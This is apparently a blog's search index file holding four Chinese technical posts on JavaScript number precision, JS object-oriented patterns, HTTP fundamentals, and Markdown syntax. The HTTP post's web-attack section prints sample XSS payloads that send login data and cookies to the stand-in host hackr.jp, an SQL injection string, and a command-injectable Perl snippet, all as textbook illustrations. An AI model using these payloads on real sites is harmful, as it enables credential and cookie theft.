<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[JS精度丢失问题]]></title>
    <url>%2FJS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了parseFloat()方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。 JS浮点数精度丢失的原因由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。 1位用来表示符号位 11位用来表示指数 52位表示尾数 因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。 120.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环） 当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。 而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。 12345679007199254740992 &gt;&gt; 10000000000000...000 // 共计 53 个 09007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 09007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 09007199254740992 + 1 // 丢失 //9007199254740992 9007199254740992 + 2 // 未丢失 //9007199254740994 9007199254740992 + 3 // 丢失 //9007199254740992 9007199254740992 + 4 // 未丢失 //9007199254740996 由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。 在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。 常见的出错场合浮点数计算、比较：10.1 + 0.2 != 0.3 // true 大整数计算、比较：普通的整数计算比较不太容易出错，除非计算范围超出 Math.pow(2, 53) 19999999999999999 == 10000000000000001 // true 多位数字符数值转换：这种情况在一些金额的计算中较容易出现，但也是最容易被忽视的一种，当用户在输入框中输入一个位数较多的字符串（不仅仅包含大数值，小数点后位数过长也包含在这一案例中），并在前台使用JS将其转换为数值，得到的结果往往是四舍五入带有偏差的值 1234parseFloat(0.9); //0.9parseFloat(9999999999999999.9) //10000000000000000parseInt(&quot;9999999999999999&quot;); //10000000000000000parseFloat(9.999999999999999); //10 toFixed不会四舍五入：12var num = 1.335;num.toFixed(2); //1.33 解决方案浮点数计算、比较：通常解决这一问题，采用的都是将浮点部分转换成整数后进行计算 12345678910111213141516171819202122232425262728293031323334353637//浮点数转换为整数function toInt(num)&#123; var rel = &#123;&#125;; var str,pos,len,times; str = (num &lt; 0) ? -num + &apos;&apos; : num + &apos;&apos;; pos = str.indexOf(&apos;.&apos;); len = str.substr(pos+1).length; times = Math.pow(10, len); rel.times = times; rel.num = num; return rel;&#125;//计算过程function operate(a,b,op)&#123; var d1 = toInt(a); var d2 = toInt(b); var max = d1.times &gt; d2.times ? d1.times : d2.times; var rel; switch(op)&#123; case &quot;+&quot; : rel = (d1.num * max + d2.num * max) / max; break; case &quot;-&quot; : rel = (d1.num * max - d2.num * max) / max; break; case &quot;*&quot; : rel = ((d1.num * max) * (d2.num * max)) / (max * max); break; case &quot;/&quot; : rel = (d1.num * max) / (d2.num * max); break; &#125; return rel;&#125;var rel = operate(0.3,0.1,&quot;+&quot;); //0.4 多位数数值转换：前台不对这类字符串进行数值转换，传到后台后，由后台进行处理 toFix的修复：123456function toFixed(num, s) &#123; var times = Math.pow(10, s) var des = num * times + 0.5 des = parseInt(des, 10) / times return des + &apos;&apos;&#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS面向对象程序设计]]></title>
    <url>%2FJS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html</url>
    <content type="text"><![CDATA[属性类型数据属性 属性名 解释 [[Configurable]] 表示能否通过delete删除属性从而重新定义属性，默认为true [[Enumerable]] 表示能否通过for-in循环返回属性，默认为true [[Writable]] 表示能否修改属性的值，默认为true [[Value]] 包含这个属性的数值，默认为undefined 12345678var person = &#123;&#125;;Object.defineProperty(person,&quot;name&quot;,&#123; writable: false, value: &quot;Nicholas&quot;&#125;);alert(person.name); // &quot;Nicholas&quot;person.name = &quot;Greg&quot;;alert(person.name); // &quot;Nicholas&quot;,通过修改属性使之不能被修改 访问器属性 属性名 解释 [[Configurable]] 表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true [[Enumerable]] 表示能否通过for-in循环返回属性，默认为true [[Get]] 在读取属性时调用的函数，默认为undefined [[Set]] 在写入属性时调用的函数，默认为undefined 1234567891011121314151617var book = &#123; _year: 2004, edition: 1&#125;;Object.defineProperty(book,&quot;year&quot;,&#123; get: function()&#123; return this._year; &#125; set: function(newValue)&#123; if(newVale &gt; 2004)&#123; this._year = newValue; this.edition += newValue - 2004; &#125; &#125;&#125;);book.year = 2005;alert(book.edition); // 2,访问属性只能用Object.defineProperty定义 定义多个属性使用Object.defineProperty方法定义多个属性 1234567891011var book = &#123;&#125;;Object.defineProperty(book,&#123; _year: &#123; writable: true, value: 2004 &#125;, edition: &#123; wirtable: true, value: 1 &#125;&#125;); 读取属性的特性1234var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);alert(descriptor.value); //2004alert(descriptor.configurable); //falsealert(typeof descriptor.get); //&quot;undefined&quot; 创建对象工厂模式抽象了创建具体对象的过程 12345678910function createPerson(name,age,job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function()&#123; alert(this.name); &#125;; return o;&#125; 构造函数模式1234567891011121314function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = function()&#123; alert(this.name); &#125;;&#125;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);// 使用call实现在特殊作用于中调用Person函数var o = new Object();Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);o.sayName(); //&quot;Kristen&quot; 此方法特点： 没有显示地创建对象 直接将属性方法赋给了his对象 没有return语句 不同实例上的同名函数每次都是新创建初始化，他们之间不相等最好将函数定义转移到构造函数外 12345678910function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = sayName;&#125;function sayName()&#123; alert(this.name);&#125;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;); 原型模式创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。 12345678910function Person()&#123;&#125;Person.prototype.name = &quot;Nicholas&quot;;Person.prototype.age = 29;Person.prototype.job = &quot;Software Engineer&quot;;Person.prototype.sayName = function()&#123; alert(this.name);&#125;;var person1 = new Person();person1.sayName(); //&quot;Nicholas&quot;,来自原型 可以通过isPrototypeOf来确定对象之间是否存在这种关系 123alert(Person.prototype.isPrototypeOf(person1)); //truealert(Person.getPrototypeOf(person) == Person.prototype); //truealert(Obeject.getPrototypeOf(person1).name); //&quot;Nicholas&quot; 可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true 1234567alert(person1.hasOwnPrototype(&quot;name&quot;)); //falseperson1.name = &quot;Greg&quot;;alert(person1.name); //&quot;Greg&quot;,来自实例alert(person1.hasOwnPrototype(&quot;name&quot;)); //truedelete person1.name;alert(person1.name); //&quot;Nicholas&quot;,来自原型alert(person1.hasOwnPrototype(&quot;name&quot;)); //false in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中 1alert(&quot;name&quot; in person1); //true for-in循环，返回的是所有能够通过对象访问、可枚举的属性 12345678910var o = &#123; toString: function()&#123; return &quot;My Object&quot;; &#125;&#125;;for(var prop in o)&#123; if(pop == &quot;toString&quot;)&#123; alert(&quot;Found toString&quot;); //IE中不会显示，认为原型中的toString被屏蔽 &#125;&#125; 使用Object.key可以取得所有可枚举的实力属性 1234567var keys = Object.keys(Person.prototype);alert(keys); //&quot;name,age,job,sayName&quot;var p1 = new Person();p1.name = &quot;Rob&quot;;p1.age = 31;var p1Keys = Object.keys(p1);alert(p1Keys); //&quot;name,age&quot; 更简单的原型创建语法 1234567891011function Person()&#123;&#125;Person.prototype = &#123; name: &quot;Nicholas&quot;, age: 29, job: &quot;Software Engineer&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person 对原型对象所做的修改可以立即从实例上反映出来 12345var friend = new Person();Person.prototype.sayHi = function()&#123; alert(&quot;Hi&quot;);&#125;friends.sayHi(); //&quot;Hi&quot; 但重写整个原型对象就不可以了，此时constructor指向新创建的对象 12345678910111213var Person()&#123;&#125;var friend = new Person();Person.prototype = &#123; constructor: Person, name: &quot;Nicholas&quot;, age: 29, job: &quot;Software Engineer&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;;friends.sayName(); //error 通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法 12345String.prototype.startsWith = function(text)&#123; return this.indexOf(text) == 0;&#125;;var msg = &quot;Hello world&quot;;alert(msg.startsWith(&quot;Hello&quot;)); //true 原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组 组合使用构造函数和原型模式构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性 1234567891011121314151617function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];&#125;Person.prototype = &#123; constructor: Person, sayName: function()&#123; alert(this.name); &#125;&#125;;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);person1.friends.push(&quot;Van&quot;);alert(person1.friends); //&quot;Shelly,Court,Van&quot;alert(person2.friends); //&quot;Shelly,Court&quot; 动态原型模式通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型 12345678910function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; if(typeof this.sayName != &quot;function&quot;)&#123; Person.prototype.sayName = function()&#123; alert(this.name); &#125; &#125;&#125; 寄生构造函数模式该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象 12345678910function SpecialArray()&#123; var values = new Array(); values.push.apply(values,arguments); values.toPipedString = function()&#123; return this.join(&quot;|); &#125;; return values;&#125;var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);alert(colors.toPipedString()); //&quot;red|blue|green&quot; 稳妥构造函数模式稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用 1234567function Person(name,age,job)&#123; var o = new Object(); o.sayName = function()&#123; alert(name); //name只能通过sayName方法访问 &#125;; return 0;&#125; 继承原型链实现原型链的基本模式 123456789101112131415function SuperType()&#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function()&#123; return this.property;&#125;;function SubType()&#123; this.subproperty = false;&#125;SubType.prototype = new SuperType();SubType.prototype.getSubValue = function()&#123; return this.subproperty;&#125;;var instance = new SubType();alert(instance.getSuperValue()); //true 以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系 1234alert(instance instanceOf Object); //truealert(instance instanceOf SuperType); //truealert(instance instanceOf SubType); //truealert(Object.prototype.isPrototypeOf(instance)); //true 通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享 借用构造函数1234567891011121314151617181920212223function SuperType()&#123; this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;function SubType()&#123; SuperType.call(this); //执行了SuperType中定义的所有对象初始化代码&#125;var instance1 = new SubType();instance1.colors.push(&quot;black&quot;);alert(instance1.colors); //&quot;red,blue,green,black&quot;var instance2 = new SubType();alert(instance2.colors); //&quot;red,blue,green&quot;// 还可以传递参数function SuperType(name)&#123; this.name = name;&#125;function SubType()&#123; SuperType.call(this,&quot;Nicholas&quot;); this.age = 29;&#125;var instance = new SubType();alert(instance.name); //&quot;Nicholas&quot;alert(instance.age); //29 如同仅仅借用构造函数，则无法函数复用 组合继承使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承 12345678910111213141516171819202122232425function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;function SubType(name,age)&#123; SuperType.call(this,name); //继承属性 this.age = age;&#125;SubType.prototype = new SuperType(); //继承方法SubType.prototype.constructor = SubType;SubType.prototype.sayAge = function()&#123; alert(this.age);&#125;;var instance1 = new SubType(&quot;Nicholas&quot;,29);instance1.colors.push(&quot;black&quot;);alert(instance1.colors); //&quot;red,blue,green,black&quot;instance1.sayName(); //&quot;Nicholas&quot;instance1.sayAge(); //29var instance2 = new SubType(&quot;Greg&quot;,27);alert(instance2.colors); //&quot;red,blue,green&quot;instance2.sayName(); //&quot;Greg&quot;instance2.sayAge(); //27 原型式继承1234567891011var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]&#125;;var anotherPerson Object(person);anotherPerson.name = &quot;Greg&quot;;anotherPerson.friends.push(&quot;Rob&quot;);var getAnotherPerson = Object(person);getAnotherPerson.name = &quot;Linda&quot;;getAnotherPerson.friends.push(&quot;Barbie&quot;);alert(person.friends); //&quot;Shelby,Court,Van,Rob,Barbie&quot; ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同 12345678910var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]&#125;;var anotherPerson = Object.create(person,&#123; name: &#123; value: &quot;Greg&quot; &#125;&#125;);alert(anotherPerson.name); //&quot;Greg&quot; 寄生式继承创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象 1234567function createAnother(original)&#123; var clone = Object(original); //创建一个新对象，Object函数不是必需的 clone.sayHi = function()&#123; alert(&quot;Hi&quot;); &#125;; return clone;&#125; 寄生组合继承1234567891011121314151617181920fucntion inheritP(subType,superType)&#123; var prototype = Object(superType.prototype); prototype.constructor = subType; subType.prototype = prototype;&#125;function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;;function SubType(name,age)&#123; SuperType.call(this.name); this.age = age;&#125;inheritP(SubType,SuperType);SubType.prototype.sayAge = function()&#123; alert(this.age);&#125;;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP原理]]></title>
    <url>%2FHTTP%E5%8E%9F%E7%90%86.html</url>
    <content type="text"><![CDATA[TCP/IP协议族重要思想:分层分层： 应用层： HTTP协议：生成针对目标web服务器的HTTP请求报文。FTP协议：文件传输协议。DNS协议： 域名解析协议。 传输层： UDP协议：用户数据报协议。TCP协议：传输控制协议：利用三次握手策略。 网络层: IP协议：把各种数据包传送给对方。ARP协议：解析地址协议，通过IP地址查出对应MAC地址。 链路层：用于处理网络的硬件部分。 URI/URL URI：用字符串标识某一互联网资源。 URL： 互联网上所处的位置表示资源地点。1https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1 组成 解释 https 协议方案 user:pass 登录信息 wwww.example.com 服务器地址 :80 端口号 dir/index.html 文件路径 uid=1 查询字符串 #ch1 片段标识符 HTTP协议请求响应： 请求报文： 123456POST /from/entry HTTP/1.1Host: hacker.jpConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 16name: ueno&amp;age=37 响应报文： 12345HTTP/1.1 200 OKDate: Tue, 10 Jul 2012 06:50:15 GMTContent-Length: 362Content-Type: text/html&lt;html&gt; ...... HTTP可使用方法： GET：获取资源，目的是获取响应的主体内容。 POST：传输实体主体。 PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。 HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。 DELETE：删除文件，删除URI指定资源。 OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。 TRACE：追踪路径，用来确认连接过程中发生的一系列操作。 CONNECT：要求用隧道协议连接代理。 状态码： 状态码类别： 状态码 分类 解释 1xx Infromational(信息性状态码) 接收的请求正在处理 2xx Success(成功状态码) 请求正常处理完成 3xx Redirectiion(重定向状态码) 需要进行附加操作以完成请求 4xx Client Error(客户端错误状态码) 服务器无法处理请求 5xx Server Error(服务器错误状态码) 服务器处理请求出错 常用状态码： 状态码 解释 200 OK 从客户端发来的请求在服务端被正常处理了 204 No Content 服务器接受的请求已成功处理，但返回的响应报文不含实体主体 206 Partial Content 客户端进行了范围请求 301 Moved Permanently 永久性重定向 302 Found 临时性重定向，请求的资源已被分配了新的URI 303 See Other 与302有着相同功能，但明确要求采用GET获取资源 304 Not Modified 客户端发送附带条件请求时，服务端允许请求访问，但未满足条件 307 Temporary Redirect 与302有相同含义，但不会使POST变成GET 400 Bad Request 请求报文种存在语法错误 401 Unauthorized 需通过HTTP认证，若已进行过一次请求，则表示认证失败 403 Forbidden 请求资源的访问被服务器拒绝 404 Not Found 服务器上无法找到请求的资源 500 Internal Server Error 服务器端在执行请求时发生了错误 503 Service Unavailable 服务器暂处于超负载或正在进行停机维护，无法处理请求 通信数据转发程序：代理： 作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。 使用理由： 利用缓存技术减少网络带宽的流量组织内部针对特定网站的访问控制以获取访问日志为主要目的 分类： 缓存代理：会预先将资源的副本保存在代理服务器透明代理：不对报文做任何加工的代理类型为透明代理 网关： 作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。 隧道： 作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。 HTTP首部字段：类型： 通用首部字段：请求报文和响应报文两方都会使用的首部 请求首部字段：请求报文使用的首部 响应首部字段：响应报文使用的首部 实体首部字段：补充了资源内容更新时间等实体有关的信息 End-to-end首部和Hop-to-hop首部： 端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。 逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。 通用首部字段： Cache-Control：操作缓存的工作机制 Connection：控制不再转发给代理的首部字段，管理持久连接 Date：表明创建HTTP报文的日期和时间 Pragma：要求所有的中间服务器不返回缓存的资源 Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码 Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信 Via：追踪客户端与服务器之间的请求和响应报文的传输路径 Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告 请求首部字段： Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序 Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序 Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序 Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序 Authorization：通知服务器用户代理的认证信息 Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed From：使用用户代理的用户的电子邮件地址 Host：请求资源所处的互联网主机名和端口号 If-Match：匹配资源所用的实体标记值 If-Modified-Since：请求指定日期后更新过的资源 If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求 If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理 If-Unmodified-Since：请求在指定日期后未发生更新的资源 Max-Forwards：指定可经过的服务器最大数目 Proxy-Authorization：通知服务器认证所需要的信息 Range：通知服务器资源的指定范围 Referer：通知服务器请求的原始资源的URI TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序 User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器 响应首部字段： Accept-Ranges：用来告知客户端服务器是否能处理范围请求 Age：告知客户端源服务器在多久前创建了响应，单位为妙 Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式 Location：将响应接收方引导至某个与请求URI位置不同的资源 Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端 Retry-After：告知客户端在多久之后再次发送请求 Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息 Vary：可对缓存进行控制 www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案 实体首部字段： Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法 Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式 Content-Language：告知客户端实体主体使用的自然语言 Content-Length：表明了实体主体部分的大小 Content-Location：与报文主体部分相对应的URI Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达 Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求 Content-Type：说明了实体主体内对象的媒体类型 Expires：将资源失效的日期告知客户端 Last-Modified：指明资源最终修改的时间 为Cookie服务的首部字段： Set-Cookie： expires属性：指定浏览器可发送Cookie的有效期path属性：限制指定Cookie的发送范围的文件目录domain属性：作为Cookie适用对象的域名secure属性：仅在HTTPS安全通信时才会发送CookieHttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问 Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie 其他首部字段： X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击 X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关 DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法 P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式 HTTP和HTTPSHTTP的缺点： 通信使用明文(不加密)，内容可能会被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能已遭篡改 HTTPS：定义： HTTPS实在HTTP通信接口部分用SSL和TLS协议代替 添加了加密及认证机制的HTTP成为HTTPS 安全通信机制： HTTP认证： Basic认证：采用Base64编码，发送明文密码 Digest认证：使用质询/响应方式 SSL客户端认证：借由HTTPS的客户端证书完成认证 基于表单认证：最常用，并用Cookie来管理Session会话 基于HTTP的功能追加协议SPDYHTTP的瓶颈： 一条连接上只可发送一个请求 请求只能从客户端开始，客户端不可以接收响应以外的指令 请求/响应首部未经压缩就发送，首部信息越多延迟越大 发送冗长的首部，每次互相发送相同的首部造成的浪费较多 可任意选择数据压缩格式，非强制压缩发送 解决方法： Ajax：异步请求实现局部刷新，但可能存在大量请求产生 Comet：一旦服务器内容更新了，可以立即反馈给客户端 SPDY： 以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接HTTP 应用层SPDY 会话层SSL 表示层TCP 传输层多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求赋予请求优先级：可以给请求逐个分配优先级顺序压缩HTTP首部：压缩HTTP请求和响应的首部推送功能：支持服务器主动向客户端推送数据的功能服务器提示功能：服务器可以主动提示客户端请求所需的资料 WebSocket定义: 即Web浏览器与Web浏览器服务器之间全双工通信标准 特点: 推送功能：支持由服务器向客户端推送数据的推送功能 减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态 WebSocketAPI: JavaScript可调用API，实现WebSocket协议下全双工通信 12345678var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);socket.onopen = function()&#123; setInternal(function()&#123; if(socket.bufferedAmout == 0)&#123; socket.send(getUpdateData()); &#125; &#125;,50);&#125; WebDAV定义: WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统 引入概念: 集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作 资源(Resource)：把文件或集合称为资源 属性(Property)：定义资源的属性 锁(Lock)：把文件设置成无法编辑状态 新增方法及状态码: PROPFIND：获取属性 PROPPATCH：修改属性 MKCOL：创建集合 COPY：复制资源及属性 MOVE：移动资源 LOCK：资源加锁 UNLOCK：资源解锁 状态码 解释 102 Processing 可正常处理请求，但目前是处理中状态 207 Multi-Status 存在多种状态 422 Unprocessible Entity 格式正确，内容有误 423 Locked 资源已被加锁 424 Failed Dependency 处理与某请求关联的请求失败，因此不再维持依赖关系 507 Insufficient Storage 保存空间不足 Web的攻击技术跨站脚本攻击(XSS)定义: 是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击 造成影响: 利用虚假输入表单骗取用户个人信息 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求 显示伪造的文章或图片 攻击案例: 获取用户登录信息 1http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot; 对用户Cookie的窃取攻击 123456http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;xss.js文件：var content = escape(document.cookie);document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);document.write(content);document.write(&quot;&gt;&quot;); SQL攻击定义: 指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击 造成影响: 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务器业务关联的程序等 攻击案例:12http://example.com/search?q=marry&apos;--select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1; OS命令注入攻击定义: 指通过Web应用，执行非法的操作系统命令达到攻击的目的 攻击案例:123my $adr = $q -&gt; param(&apos;mailaddress&apos;);open(MAIL,&quot;|/user/sbin/senmail $adr&quot;);print MAIL &quot;Form:info@example.com\n&quot;; HTTP首部注入攻击定义: 是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击 邮件首部注入攻击定义: 是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击 目标遍历攻击定义: 是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击 跨站点请求伪造(CSRF)定义: 指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新 点击劫持定义: 指利用透明的按钮或链接做成陷阱覆盖在Web页面之上 DoS攻击定义: 是一种让运行中的服务呈停止状态的攻击]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown常用语法]]></title>
    <url>%2FMarkdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html</url>
    <content type="text"><![CDATA[标题在Markdown中，标题一共分为六级，只需在文字前加上 # 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码： 123456# h1## h2### h3#### h4##### h5###### h6 分级标题与标题作用类似，= 和 - 最少可只写一个，兼容性一般。代码： 1234一级标题============二级标题------------ 目录根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码： 1[TOC] 引用引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 &gt; 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码： 单行式1&gt; hello world! 效果： hello world! 多行式12&gt; hello world!brand new world! 或 12&gt; hello world!&gt; brand new world! 效果相同： hello world!brand new world! 嵌套式12&gt; hello world!&gt;&gt; brand new world! 效果： hello world! brand new world! 代码块代码块可分为行内代码块和多行代码块。代码： 行内代码1`&lt;div&gt;&lt;/div&gt;` 效果：&lt;div&gt;&lt;/div&gt; 代码块用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。效果： &lt;div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;/div&gt; 自定义语法该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上) 123456\```javascriptvar num = 0;for (var i = 0; i &lt; 5; i++) &#123; num+=i;&#125;\```console.log(num); 效果： 12345var num = 0;for (var i = 0; i &lt; 5; i++) &#123; num+=i;&#125;console.log(num); 列表Markdown中支持两种列表：无序列表和有序列表。 无序列表无序列表有三种语法,可使用 * 、+ 、 -作为列表标记。代码： 123* Red* Green* Blue 或 123+ Red+ Green+ Blue 或 123- Red- Green- Blue 效果： Red Green Blue 有序列表在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码： 1231. Bird2. McHale3. Parish 效果： Bird McHale Parish 分割线可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码： 123456789* * *********- - ---------------------------------------- 效果： 链接Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。 行内式要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码： 1[an example](http://example.com/&quot;Title&quot;)&#123;: 效果：an example 参考式该链接必须带 http:// ，否则会被解析成本地路径，代码： 12[an example][id][id]: http://example.com/ 效果：an example 图片Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 ! 。同样分为行内式和参考式。 行内式方括号中用来放图片无法正常显示时的替代文字，代码： 1![Alt text](../assets/blogImg/avatar.png) 参考式代码： 12![Alt text][01][01]: 